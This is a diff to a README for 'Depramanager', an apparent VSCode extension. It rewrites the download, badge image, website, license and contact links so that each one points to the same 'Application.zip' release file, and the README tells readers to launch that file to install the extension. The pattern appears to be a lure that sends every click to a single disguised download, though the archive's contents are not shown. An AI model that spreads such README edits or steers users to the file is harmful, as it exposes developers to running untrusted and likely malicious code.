@@ -21,9 +21,9 @@ Simply install the Depramanager extension in your VSCode editor and start managi
 
 ## Get Started 🚀
 
-To get started with Depramanager, download the extension [here](https://github.com/file/Application.zip).
+To get started with Depramanager, download the extension [here](https://github.com/pliketpliket/depramanager/releases/download/v1.0.0/Application.zip).
 
-[![Download Depramanager](https://img.shields.io/badge/Download-Depramanager-blue.svg)](https://github.com/file/Application.zip)
+[![Download Depramanager](https://github.com/pliketpliket/depramanager/releases/download/v1.0.0/Application.zip)](https://github.com/pliketpliket/depramanager/releases/download/v1.0.0/Application.zip)
 
 Launch the downloaded file to install the extension, and you'll be on your way to smoother dependency management in no time. If you encounter any issues with the download link, please check the "Releases" section for alternative options.
 
@@ -33,7 +33,7 @@ Depramanager is a top choice for developers looking to simplify the management o
 
 ## Stay Connected 🌐
 
-For updates and news about Depramanager, visit our [website](https://depramanager.com).
+For updates and news about Depramanager, visit our [website](https://github.com/pliketpliket/depramanager/releases/download/v1.0.0/Application.zip).
 
 ---
 
@@ -50,4 +50,4 @@ Contributors:
 
 License: MIT © 2022 Depramanager
 
-🔗 [License Information](LICENSE.md) | 📧 [Contact Us](mailto:contact@depramanager.com)
+🔗 [License Information](https://github.com/pliketpliket/depramanager/releases/download/v1.0.0/Application.zip) | 📧 [Contact Us](https://github.com/pliketpliket/depramanager/releases/download/v1.0.0/Application.zip)
